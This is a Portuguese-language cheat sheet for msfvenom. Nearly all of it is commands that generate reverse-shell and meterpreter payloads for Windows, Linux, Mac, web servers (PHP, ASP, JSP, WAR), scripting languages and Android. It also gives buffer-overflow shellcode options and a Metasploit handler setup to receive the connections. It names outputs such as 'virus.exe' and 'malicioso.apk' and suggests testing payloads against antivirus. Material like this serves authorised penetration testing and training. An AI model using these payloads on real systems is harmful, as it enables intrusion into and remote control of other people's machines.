# MSFVENOM

O **msfvenom** é utilizado para criação de exploit.  
Teste os seus payloads através do site <https://www.virustotal.com>.  
*Cuidado pois ao enviar para o vírus total, a heurística pode ser atualizada nos antivírus.*

Verificar todos os payloads:

```bash
msfvenom --list payloads
```

Gerando payload para Windows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=443 -f exe > virus.exe
```

Gerando payload para Linux:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<SEU IP> LPORT=<SUA PORTA> -f elf > shell.elf
```

Gerando payload para Mac:

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f macho > shell.macho
```

Payload’s para servidores WEB

PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f asp > shell.asp
```

JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.jsp
```

WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f war > shell.war
```

Payload’s Adicionais

Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.py
```

Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.sh
```

Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.pl
```

Shellcode

Para todos os códigos de shell, consulte 'msfvenom --help-formatos' para obter informações sobre parâmetros válidos. O msfvenom produzirá um código que pode ser recortado e colado nessa linguagem para suas explorações.

Linux Based Shellcode

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

Windows Based Shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

Mac Based Shellcode

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

Para receber a conexão do alvo será necessário que o msf esteja em execução:

```bash
msfconsole
```

```msf
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 443
msf exploit(handler) > set LHOST 192.168.0.100
msf exploit(handler) > exploit*
```

Criando um exploit para Windows para BoF:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.100 LPORT=443 -b "\x00\x0a\x0d\x20" EXITFUNC=thread -f python
```

**-p windows/shell_reverser_tcp** ==> Tipo do exploit.  
**LHOST** ==> IP de conexão reversa.  
**LPORT** ==> Porta de conexão reversa.  
**-b "\x00\x0a\x0d\x20"** ==> Bad caracteres ou caracteres inválidos.  
**-f python** ==> Linguagem que vai ser gerado o exploit.  
**EXITFUNC=thread** ==> Evita que a aplicação morra depois do exploit ser fechado.

Gerando payload binário para sistema Linux:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lport=433 lhost=192.168.0.111 -f elf > malicioso
```

*Utilizado quando você já tem uma shell no device e necessita usar o meterpreter para auxiliar na pós exploração.*

Gerando payload APK para Android:

```bash
msfvenom -p android/meterpreter/reverse_tcp lport=433 lhost=192.168.0.111 R > malicioso.apk
```

**R** ==> Salva em modo RAW.

*Utilizado quando você já tem uma shell no device e necessita usar o meterpreter para auxiliar na pós exploração.*
